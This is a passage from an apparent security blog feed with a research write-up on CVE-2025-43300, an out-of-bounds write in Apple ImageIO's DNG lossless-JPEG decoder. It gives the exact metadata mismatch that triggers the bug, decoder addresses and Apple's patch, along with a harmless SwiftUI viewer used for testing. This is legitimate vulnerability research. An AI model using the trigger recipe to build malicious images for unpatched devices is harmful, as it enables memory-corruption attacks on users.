id="2-DNG"><a href="#2-DNG" class="headerlink" title="2. DNG"></a>2. DNG</h3><p>DNG (Digital Negative) is <strong>Adobe&#x2019;s RAW image container format</strong>, built upon <strong>TIFF/EP</strong> structure.</p><p>It stores raw sensor data (e.g., Bayer CFA), thumbnails, and color correction metadata.</p><p>Key tags:</p><ul><li><strong>RowsPerStrip / TileWidth / TileLength</strong></li><li><strong>StripOffsets / TileOffsets</strong></li><li><strong>StripByteCounts / TileByteCounts</strong></li><li><strong>SamplesPerPixel / BitsPerSample</strong></li></ul><p>The decoder uses these values to calculate</p><p><strong>buffer offsets</strong>, <strong>BytesPerRow</strong>, and <strong>total data size</strong> for writing.</p><h3 id="3-RAW-and-Compression"><a href="#3-RAW-and-Compression" class="headerlink" title="3. RAW and Compression"></a>3. RAW and Compression</h3><p>RAW data is unprocessed, high bit-depth sensor output (e.g., 12/14/16 bits per pixel, typically 1 sample per pixel).</p><p>To save space, DNG supports <strong>lossless compression</strong>, most notably <strong>JPEG Lossless (SOF3)</strong>.</p><ul><li>Compression = 1 &#x2192; Uncompressed</li><li>Compression = 7 &#x2192; JPEG (Baseline or Lossless)</li><li>Compression = 8 &#x2192; Deflate (ZIP)</li><li>Compression = 34892 &#x2192; JPEG Baseline (Lossy)</li></ul><p>&#x2705; The vulnerability resides in the <strong>Lossless JPEG (SOF3)</strong> decoding path.</p><hr><h2 id="1-3-PoC"><a href="#1-3-PoC" class="headerlink" title="1.3 PoC"></a>1.3 PoC</h2><p><img src="/2025/10/23/clalxk/imageIO_en/image16.png" alt="image.png"></p><p>Normal DNG files typically <strong>do not</strong> reach the vulnerable path.</p><p>However, by tweaking metadata tags (for example, <code>SamplesPerPixel</code>) so that the initial checks pass, we can force the code path to invoke the vulnerable function.</p><p>I ran this on my phone without updating it (because I had no space &#x1F602;).</p><p><img src="/2025/10/23/clalxk/imageIO_en/image17.png" alt="image.png"></p><p>My device is on <strong>iOS 18.1.1</strong>.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image18.png" alt="image.png"></p><p>Using the small DNG viewer app above, I loaded the PoC DNG and observed the following:</p><pre><code class="hljs c"><span class="hljs-keyword">import</span> SwiftUI<span class="hljs-keyword">import</span> UniformTypeIdentifiers<span class="hljs-keyword">import</span> Combine<span class="hljs-keyword">import</span> UIKit<span class="hljs-keyword">import</span> CoreImage<span class="hljs-keyword">import</span> CoreImage.CIFilterBuiltins@main<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DNGViewerApp</span>:</span> App {    var body: some Scene {        WindowGroup {            ContentView()        }    }}<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RawRenderer</span>:</span> ObservableObject {    <span class="hljs-keyword">private</span> let context = CIContext(options: [        .cacheIntermediates: <span class="hljs-literal">false</span>    ])    @Published var image: UIImage?    @Published var <span class="hljs-built_in">log</span>: String = <span class="hljs-string">&quot;&quot;</span>    func render(from url: URL) {        <span class="hljs-built_in">log</span> = <span class="hljs-string">&quot;Loading: \(url.lastPathComponent)\n&quot;</span>                guard let raw = CIRAWFilter(imageURL: url, options: [:]) <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;CIRAWFilter unavailable or failed to open URL\n&quot;</span>            <span class="hljs-keyword">return</span>        }          guard let ciImage = raw.value(forKey: kCIOutputImageKey) as? CIImage <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Failed to get CIImage\n&quot;</span>; <span class="hljs-keyword">return</span>        }        let extent = ciImage.extent.integral        guard let cg = context.createCGImage(ciImage, from: extent) <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Failed to create CGImage\n&quot;</span>; <span class="hljs-keyword">return</span>        }        image = UIImage(cgImage: cg)        <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Rendered: \(Int(extent.width))&#xD7;\(Int(extent.height))\n&quot;</span>    }}struct ContentView: View {    @StateObject var renderer = RawRenderer()    @State <span class="hljs-keyword">private</span> var showPicker = <span class="hljs-literal">false</span>    var body: some View {        VStack(spacing: <span class="hljs-number">12</span>) {            <span class="hljs-keyword">if</span> let img = renderer.image {                Image(uiImage: img)                    .resizable()                    .scaledToFit()                    .background(Color.black.opacity(<span class="hljs-number">0.05</span>))                    .cornerRadius(<span class="hljs-number">12</span>)                    .padding(.horizontal)            } <span class="hljs-keyword">else</span> {                Text(<span class="hljs-string">&quot;Open a DNG&quot;</span>).foregroundColor(.secondary)                    .padding(.top, <span class="hljs-number">40</span>)            }            HStack {                Button(<span class="hljs-string">&quot;Open DNG&quot;</span>) { showPicker = <span class="hljs-literal">true</span> }                .buttonStyle(.borderedProminent)                Button(<span class="hljs-string">&quot;Clear&quot;</span>) { renderer.image = nil; renderer.<span class="hljs-built_in">log</span> = <span class="hljs-string">&quot;&quot;</span> }                .buttonStyle(.bordered)            }            ScrollView {                Text(renderer.<span class="hljs-built_in">log</span>)                    .font(.system(.caption, design: .monospaced))                    .frame(maxWidth: .infinity, alignment: .leading)                    .padding()                    .background(Color.black.opacity(<span class="hljs-number">0.03</span>))                    .cornerRadius(<span class="hljs-number">8</span>)            }            .frame(maxHeight: <span class="hljs-number">160</span>)            .padding(.horizontal)        }        .sheet(isPresented: $showPicker) {            DocumentPicker { url in                <span class="hljs-keyword">if</span> let url { renderer.render(from: url) }            }        }    }}struct DocumentPicker: UIViewControllerRepresentable {    var onPick: (URL?) -&gt; Void    func makeCoordinator() -&gt; Coordinator { Coordinator(onPick: onPick) }    func makeUIViewController(context: Context) -&gt; UIDocumentPickerViewController {        <span class="hljs-comment">// DNG UTI&#xB294; &#xC804;&#xD1B5;&#xC801;&#xC73C;&#xB85C; &quot;com.adobe.raw-image&quot;.</span>        <span class="hljs-comment">// iOS 14+&#xC5D0;&#xC120; UTType.image(&#xB610;&#xB294; item)&#xB85C; &#xC5F4;&#xC5B4;&#xB3C4; &#xBB34;&#xBC29;.</span>        let vc = UIDocumentPickerViewController(forOpeningContentTypes: [            UTType(importedAs: <span class="hljs-string">&quot;com.adobe.raw-image&quot;</span>), <span class="hljs-comment">// DNG</span>            .image, .item        ])        vc.allowsMultipleSelection = <span class="hljs-literal">false</span>        vc.delegate = context.coordinator        <span class="hljs-keyword">return</span> vc    }    func updateUIViewController(_ uiViewController: UIDocumentPickerViewController, context: Context) {}    <span class="hljs-keyword">final</span> class Coordinator: NSObject, UIDocumentPickerDelegate {        let onPick: (URL?) -&gt; Void        init(onPick: @escaping (URL?) -&gt; Void) { self.onPick = onPick }        func documentPicker(_ controller: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {            onPick(urls.first)        }        func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) { onPick(nil) }    }}</code></pre><p><img src="/2025/10/23/clalxk/imageIO_en/image19.png" alt="image.png"></p><p>Here is the image that was used.</p><p>Using this viewer to load the PoC DNG file, I observed the following details:</p><ul><li><code>CLosslessJpegUnpacker</code> at <code>0x1DD902E78</code></li><li><code>CDNGLosslessJpegUnpacker</code> at <code>0x1DD95DE88</code></li><li><code>CDNGLosslessJpegUnpacker::unpackTile</code> at <code>0x1DD95B198</code></li><li><code>CLosslessJpegRestartUnpacker</code> at <code>0x1DD95F784</code></li></ul><p><strong>Trigger conditions:</strong></p><ul><li>JPEG marker: <strong>SOF3 (Lossless JPEG)</strong> present</li><li>DHT (Define Huffman Table(s)) present</li><li>SOS (Start Of Scan) valid</li><li><strong>BitsPerSample = 16</strong></li><li><strong>SamplesPerPixel = 2</strong> (TIFF tag)</li><li><strong>NumComponents = 1</strong> (SOF3/JPEG stream)</li></ul><p>The root cause is a mismatch between how the loop termination condition is computed versus how the inner loop performs writes:</p><p><img src="/2025/10/23/clalxk/imageIO_en/image20.png" alt="image.png"></p><ul><li>The outer pixel loop is bounded by <strong>NumComponents</strong> = 1 (so it expects one component per pixel),</li><li>but the inner write routine assumes <strong>SamplesPerPixel</strong> = 2 and writes <strong>two 16-bit samples per pixel</strong>, advancing the destination pointer as if there are two samples per pixel.</li></ul><p>As a result, each row ends up writing <strong>twice</strong> the expected number of bytes &#x2192; <strong>out-of-bounds writes</strong> occur at the row boundary.</p><p>Following the flow, you can trace the chain like:</p><pre><code class="hljs apache"><span class="hljs-attribute">0x1DD95B198</span> &#x2192; <span class="hljs-number">0</span>x<span class="hljs-number">1</span>DD<span class="hljs-number">95</span>B<span class="hljs-number">6</span>C<span class="hljs-number">4</span> &#x2192; <span class="hljs-number">0</span>x<span class="hljs-number">1</span>DD<span class="hljs-number">95</span>B<span class="hljs-number">8</span>DC &#x2192; <span class="hljs-number">0</span>x<span class="hljs-number">1</span>DD<span class="hljs-number">95</span>B<span class="hljs-number">944</span> &#x2192; <span class="hljs-number">0</span>x<span class="hljs-number">1</span>DD<span class="hljs-number">95</span>BCCC</code></pre><p>(Trace through these offsets to map how the pixel decoder iterates and performs the writes.)</p><p><img src="/2025/10/23/clalxk/imageIO_en/image21.png" alt="image.png"></p><p>The sample image I used is from DPReview:</p><p><a href="https://www.dpreview.com/sample-galleries/4949897610/pentax-k-3-mark-iii-sample-gallery/1638788346">https://www.dpreview.com/sample-galleries/4949897610/pentax-k-3-mark-iii-sample-gallery/1638788346</a></p><p>(Used that image as a starting point to craft a DNG variant for the PoC.)</p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>In short, <strong>CVE-2025-43300</strong> is an OOB Write caused by a mismatch between TIFF metadata and the internal JPEG Lossless stream:</p><ul><li><code>SamplesPerPixel = 2</code> (DNG tag) but <code>NumComponents = 1</code> (SOF3 stream)</li><li>Loop termination is computed against <strong>components(=1)</strong> but the inner write loop writes <strong>16-bit &#xD7; 2 samples per pixel</strong>, causing <strong>double writes per row</strong> &#x2192; <strong>OOB write</strong>.</li></ul><p>Using <code>dyld_shared_cache</code> diffs and vtable typeing, I traced the vulnerable path to the <strong>CDNGLosslessJpegUnpacker &#x2192; Tile Unpacker</strong> and identified the exact trigger conditions and dataflow.</p><p>Apple patched the issue in <strong>iOS 18.6.2</strong> by:</p><ol><li>Switching from the fragile <code>CGImage</code> + <code>CFData</code> raw traversal pipeline to a <strong>CMPhoto &#x2192; CVPixelBuffer</strong> pipeline (more robust, standardized pixel buffer APIs).</li><li>Adding explicit <strong>data size / stride validation</strong> (compare <code>CVPixelBufferGetDataSize()</code> to an internally computed expected value that takes stride into account).</li><li>Changing pixel access order/assumptions to match the actual buffer layout.</li></ol><p>If you are on a real device, update to <strong>iOS 18.6.2 or later</strong> &#x2014; the patched code prevents attempts to reach this unsafe write path. (I should update mine too &#x2014; I&#x2019;ll do that soon &#x1F602;)</p><p>That wraps up this short research note &#x2014; the path was a fun exercise in dyld cache extraction, vtable reconstruction, and low-level JPEG/DNG decoding logic. I learned a lot following the call chain and seeing how a subtle metadata mismatch can cause memory corruption.</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://github.com/b1n4r1b01/n-days/blob/main/CVE-2025-43300.md">https://github.com/b1n4r1b01/n-days/blob/main/CVE-2025-43300.md</a></p><p><a href="https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html">https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html</a></p><p><a href="https://github.com/DarkNavySecurity/PoC/tree/main/CVE-2025-43300">https://github.com/DarkNavySecurity/PoC/tree/main/CVE-2025-43300</a></p><p><a href="https://github.com/msuiche/elegant-bouncer">https://github.com/msuiche/elegant-bouncer</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/MacOS/">MacOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-43300/">CVE-2025-43300</category>
      
      <category domain="https://hackyboiz.github.io/tags/ImageIO/">ImageIO</category>
      
      <category domain="https://hackyboiz.github.io/tags/MemoryCorruption/">MemoryCorruption</category>
      
      <category domain="https://hackyboiz.github.io/tags/iOS/">iOS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] ImageIO: iOS/macOS DNG Image Processing Memory Corruption (Ko)</title>
      <link>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_ko/</link>
      <guid>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_ko/</guid>
      <pubDate>Thu, 23 Oct 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/10/23/clalxk/imageIO_ko/image.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;~ MacOS &amp;#xC2DC;&amp;#xB9A</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/10/23/clalxk/imageIO_ko/image.png" alt="image.png"></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;~ MacOS &#xC2DC;&#xB9AC;&#xC988;&#xB97C; &#xB9C8;&#xCE58;&#xACE0; &#xC774;&#xBC88;&#xC5D4; ImageIO&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC624;&#xB298;&#xC740; &#xC9C0;&#xB09C; 8&#xC6D4; 20&#xC77C;, iOS/MacOS/iPadOS &#xB4F1;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; ImageIO &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, &#xD2B9;&#xC815; &#xC778;&#xBB3C;&#xC744; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xC545;&#xC6A9;&#xB41C; &#xAC8C; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xD654;&#xC81C;&#xAC00; &#xB418;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xC5B4;&#xB5A4; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xC5C8;&#xB294;&#xC9C0; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! </p><p>&#xC790;.. &#xADF8;&#xB7FC; &#xC2DC;&#xC791;&#xD574;&#xBCFC;&#xAE4C;&#xC694;.. !!!  </p><hr><h1 id="0-ImageIO"><a href="#0-ImageIO" class="headerlink" title="0. ImageIO"></a>0. <a href="https://developer.apple.com/documentation/imageio">ImageIO</a></h1><p>ImageIO&#xB294; Apple&#xC758; macOS, iOS, iPadOS &#xB4F1;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <strong>&#xC774;&#xBBF8;&#xC9C0; &#xCC98;&#xB9AC; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;</strong>&#xB85C;, &#xB2E4;&#xC591;&#xD55C; &#xC774;&#xBBF8;&#xC9C0; &#xD615;&#xC2DD;&#xC758; &#xC77D;&#xAE30;, &#xC4F0;&#xAE30;, &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xC811;&#xADFC;, &#xC555;&#xCD95; &#xBC0F; &#xB514;&#xCF54;&#xB529;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. Apple&#xC758; Core Graphics &#xBC0F; Photos, Preview, Safari, Messages, AirDrop, Mail, iCloud&#xC640; &#xAC19;&#xC740; &#xC2DC;&#xC2A4;&#xD15C; &#xC571;&#xACFC; &#xAE30;&#xB2A5;&#xC758; &#xC774;&#xBBF8;&#xC9C0; &#xCC98;&#xB9AC; &#xBC31;&#xC5D4;&#xB4DC;&#xB85C; &#xD3ED;&#xB113;&#xAC8C; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="1-CVE-2025-43300"><a href="#1-CVE-2025-43300" class="headerlink" title="1. CVE-2025-43300"></a>1. CVE-2025-43300</h1><p><img src="/2025/10/23/clalxk/imageIO_ko/image1.png" alt="image.png"></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Apple ImageIO &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC778; RawCamera&#xC758; JPEG Lossless (<code>SOF3</code>) &#xB514;&#xCF54;&#xB354;(<code>CDNGLosslessJpegUnpacker</code>)&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; OOB Write &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, DNG &#xD30C;&#xC77C;&#xC758; TIFF &#xD0DC;&#xADF8;(<code>SamplesPerPixel</code>)&#xC640; &#xB0B4;&#xBD80; JPEG &#xC2A4;&#xD2B8;&#xB9BC;&#xC758; component &#xC218;&#xAC00; &#xBD88;&#xC77C;&#xCE58;&#xD560; &#xB54C; &#xC798;&#xBABB;&#xB41C; &#xB8E8;&#xD504; &#xC0C1;&#xD55C; &#xB54C;&#xBB38;&#xC5D0; &#xCD9C;&#xB825; &#xBC84;&#xD37C;&#xB97C; &#xB118;&#xACA8; &#xC4F0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC9C0;&#xB09C; 8&#xC6D4; 20&#xC77C;&#xC5D0; iOS 18.6.2 &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;(&#xD328;&#xCE58;) &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD55C; &#xBC84;&#xC804;: 18.6.1</li><li>&#xD328;&#xCE58; &#xB41C; &#xBC84;&#xC804;: 18.6.2</li></ul><p><img src="/2025/10/23/clalxk/imageIO_ko/image2.png" alt="image.png"></p><p>&#xC6B0;&#xC120; 18.6.2 &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC5B4;&#xB290; &#xBD80;&#xBD84;&#xC774; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0;&#xC790; &#xD569;&#xB2C8;&#xB2E4;.</p><p>ipsw &#xBC84;&#xC804; &#xBCC4;&#xB85C; diff&#xD55C; &#xACB0;&#xACFC;&#xB97C; &#xC62C;&#xB824;&#xC8FC;&#xB294; <a href="https://github.com/blacktop/ipsw-diffs/tree/main"><strong>ipsw-diffs</strong></a>&#xB97C; &#xD1B5;&#xD574; 18.6.1&#xACFC; 18.6.2&#xC758; diff &#xB0B4;&#xC6A9;&#xC744; &#xB300;&#xB7B5;&#xC801;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>RawCamera</strong></p><blockquote><p>/System/Library/CoreServices/RawCamera.bundle/RawCamera</p></blockquote><pre><code class="hljs bash">-1738.140.3.0.0-  __TEXT.__text: 0x1e2d70-  __TEXT.__auth_stubs: 0x1850+1738.140.3.0.11+  __TEXT.__text: 0x1e3470+  __TEXT.__auth_stubs: 0x1870   __TEXT.__objc_methlist: 0x16e4   __TEXT.__const: 0x15326-  __TEXT.__gcc_except_tab: 0x2d440+  __TEXT.__gcc_except_tab: 0x2d588   __TEXT.__oslogstring: 0xec0   __TEXT.__cstring: 0xee23   __TEXT.__dof_RawCamera: 0x8f7-  __TEXT.__unwind_info: 0xb1d0+  __TEXT.__unwind_info: 0xb1e8   __TEXT.__eh_frame: 0x278   __TEXT.__objc_classname: 0x4b9   __TEXT.__objc_methname: 0x3918   __TEXT.__objc_methtype: 0xdd3   __TEXT.__objc_stubs: 0x2da0-  __DATA_CONST.__got: 0x9b0+  __DATA_CONST.__got: 0x9c8   __DATA_CONST.__const: 0x2a18   __DATA_CONST.__objc_classlist: 0x1e0   __DATA_CONST.__objc_catlist: 0x20   __DATA_CONST.__objc_imageinfo: 0x8   __DATA_CONST.__objc_selrefs: 0xcf8   __DATA_CONST.__objc_superrefs: 0xf0-  __DATA_CONST.__objc_arraydata: 0x3948-  __AUTH_CONST.__auth_got: 0xc40+  __DATA_CONST.__objc_arraydata: 0x3950+  __AUTH_CONST.__auth_got: 0xc50   __AUTH_CONST.__const: 0x35978   __AUTH_CONST.__cfstring: 0x18080   __AUTH_CONST.__objc_const: 0x48b0-  __AUTH_CONST.__objc_arrayobj: 0x570-  __AUTH_CONST.__objc_intobj: 0x39f0+  __AUTH_CONST.__objc_arrayobj: 0x588+  __AUTH_CONST.__objc_intobj: 0x3a20   __AUTH_CONST.__objc_doubleobj: 0x480   __AUTH_CONST.__objc_dictobj: 0x4d58   __AUTH_CONST.__objc_floatobj: 0xc0   - /System/Library/Frameworks/UniformTypeIdentifiers.framework/UniformTypeIdentifiers   - /System/Library/PrivateFrameworks/AppleJPEG.framework/AppleJPEG   - /System/Library/PrivateFrameworks/AppleJPEGXL.framework/AppleJPEGXL+  - /System/Library/PrivateFrameworks/CMPhoto.framework/CMPhoto   - /System/Library/PrivateFrameworks/CoreAnalytics.framework/CoreAnalytics   - /System/Library/PrivateFrameworks/MobileAsset.framework/MobileAsset   - /usr/lib/libSystem.B.dylib   - /usr/lib/libobjc.A.dylib   - /usr/lib/libxml2.2.dylib   - /usr/lib/libz.1.dylib-  UUID: 1BE38EB6-51C0-3069-A50F-CA3B000E0847-  Functions: 6433-  Symbols:   781+  UUID: AF5B7B35-3549-329B-B706-F877FA8DF849+  Functions: 6435+  Symbols:   786   CStrings:  7487 Symbols:+ _CMPhotoDecompressionContainerCreateImageForIndex+ _CMPhotoDecompressionContainerGetImageCount+ _CMPhotoDecompressionSessionCreate+ _CMPhotoDecompressionSessionCreateContainer+ _CVPixelBufferGetDataSize+ _kCMPhotoContainerFormatString_JFIF+ _kCMPhotoDecompressionContainerOption_AllowedFormatsAndCodecs+ _kCMPhotoDecompressionOption_OutputPixelFormat- _CGImageGetBytesPerRow- _CGImageGetHeight- _CGImageGetWidth</code></pre><p>&#xB2E4;&#xB978; &#xBD80;&#xBD84;&#xC740; &#xBC14;&#xB010; &#xAC8C; &#xC5C6;&#xACE0; <strong>RawCamera</strong>&#xB9CC; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xCF54;&#xB4DC; &#xB808;&#xBCA8;&#xC774; &#xBCF4;&#xC774;&#xC9C0; &#xC54A;&#xC544;&#xC11C; ida&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/23/clalxk/imageIO_ko/image3.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image4.png" alt="image.png"></p><p>ipsw&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; 18.6.1 &#xACFC; 18.6.2 &#xBC84;&#xC804;&#xC744; &#xB2E4;&#xC6B4;&#xBC1B;&#xC544; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/23/clalxk/imageIO_ko/image5.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image6.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image7.png" alt="image.png"></p><p><code>dyld_shared_cache</code> &#xB294; iOS/macOS&#xAC00; &#xBD80;&#xD305; &#xC2DC; <strong>&#xC790;&#xC8FC; &#xC4F0;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB7;&#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xD55C; &#xB369;&#xC5B4;&#xB9AC;&#xB85C; &#xBBF8;&#xB9AC; &#xBB36;&#xC5B4; &#xB454; &#xCE90;&#xC2DC; &#xD30C;&#xC77C;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xAC01;&#xC885; <code>.dylib</code> / Framework&#xB4E4;&#xC774; <strong>&#xCD5C;&#xC801;&#xD654;</strong>&#xB41C; &#xC0C1;&#xD0DC;&#xB85C; &#xB4E4;&#xC5B4; &#xC788;&#xC5B4; &#xC571; &#xC2DC;&#xC791;&#xC774; &#xBE68;&#xB77C;&#xC9C0;&#xACE0; &#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC6A9;&#xC774; &#xC904;&#xC5B4;&#xB4DC;&#xB294; &#xD2B9;&#xC9D5;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C; &#xAE30;&#xAE30;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xBC14;&#xB85C; &#xC774; &#xCE90;&#xC2DC; &#xC548;&#xC758; &#xC774;&#xBBF8;&#xC9C0;&#xB4E4;&#xC774;&#xB77C;, &#xCE90;&#xC2DC;&#xC5D0;&#xC11C; RawCamera &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; &#xBD84;&#xC11D;/&#xBE44;&#xAD50;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C; ipsw dyld extract&#xC744; &#xD1B5;&#xD574; RawCamera&#xB97C; &#xCD94;&#xCD9C;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC;, &#xBCF8; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C;&#xB294; ida&#xC5D0;&#xC11C; &#xBC14;&#xB85C; dyld_shared_cache&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xC5EC; &#xBD84;&#xC11D;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="1-1-bindiff"><a href="#1-1-bindiff" class="headerlink" title="1.1 bindiff"></a>1.1 bindiff</h2><p><img src="/2025/10/23/clalxk/imageIO_ko/image8.png" alt="image.png"></p><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; BinExport &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; &#xB514;&#xD551;&#xC744; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/23/clalxk/imageIO_ko/image9.png" alt="image.png"></p><p>&#xC6A9;&#xB7C9;&#xC774; &#xBD80;&#xC871;&#xD558;&#xC5EC; bindiff&#xB294; &#xACF5;&#xAC1C;&#xB41C; &#xBD84;&#xC11D; &#xAE00;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xCC38;&#xACE0;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xCD9C;&#xCC98;: <a href="https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html">https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html</a></p><p>&#xBCC0;&#xACBD;&#xC0AC;&#xD56D;&#xC774; &#xC788;&#xB358; &#xAC83;&#xC740; 6&#xAC1C;&#xC758; &#xD568;&#xC218;&#xC600;&#xC9C0;&#xB9CC;, &#xC774; &#xC911;&#xC5D0;&#xC11C;&#xB3C4; &#xD06C;&#xAC8C; &#xC218;&#xC815;&#xB41C; &#xD568;&#xC218;&#xB294; <code>sub_1DD8A7684</code> &#xC640; <code>sub_1DD95DC1C</code> &#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB450;&#xAC1C;&#xC758; &#xD568;&#xC218;&#xB97C; &#xC911;&#xC2EC;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h2 id="1-2-Analysis"><a href="#1-2-Analysis" class="headerlink" title="1.2 Analysis"></a>1.2 Analysis</h2><p><img src="/2025/10/23/clalxk/imageIO_ko/image10.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image11.png" alt="image.png"></p><p>ipsw&#xC5D0;&#xC11C; &#xCD94;&#xCD9C;&#xD55C; <code>dyld_shared_cache</code> &#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xBD84;&#xC11D;&#xD558;&#xACE0;&#xC790; &#xD569;&#xB2C8;&#xB2E4;.</p><p><em>Apple DYLD Cache for arm64e (select module(s)) &#x2192; RawCamera</em> </p><p><img src="/2025/10/23/clalxk/imageIO_ko/image12.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image13.png" alt="image.png"></p><p>&#xC774;&#xBBF8;&#xC9C0; &#xD53D;&#xC140; &#xBC84;&#xD37C;&#xC0AC;&#xC774;&#xC988;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xB2E8;&#xACC4;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p>&#xC0C1;&#xC138; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xB97C; 